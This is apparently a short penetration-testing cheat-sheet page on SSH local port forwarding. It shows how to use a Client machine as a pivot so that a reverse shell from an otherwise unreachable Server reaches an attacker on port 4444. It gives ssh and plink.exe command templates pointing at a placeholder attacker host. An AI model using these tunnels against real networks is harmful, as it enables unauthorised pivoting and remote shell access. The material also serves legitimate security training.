# SSH Local Port Forwarding

Consider the scenario Server -> Client -> Attacker where the Server is on a subnet accessible only by the Client and we want to establish a reverse shell between Server and Attacker on port 4444 triggered by an action on  the Client machine.\
In this scenario the Client needs to be utilised as the go between for the port 4444 traffic, which is where this command will be run.

#### Linux Client

```
# ssh -N -L [client_ip:]4444:attacker_ip:attacker_port username@attacker_ip
```

#### Windows Client

```
c:\> plink.exe -ssh -N -L [client_ip:]client_port:attacker_ip:attacker_port username@attacker_ip
```

{% hint style="info" %}
Ensure the ssh server is running and port is open on the attacker machine.
{% endhint %}
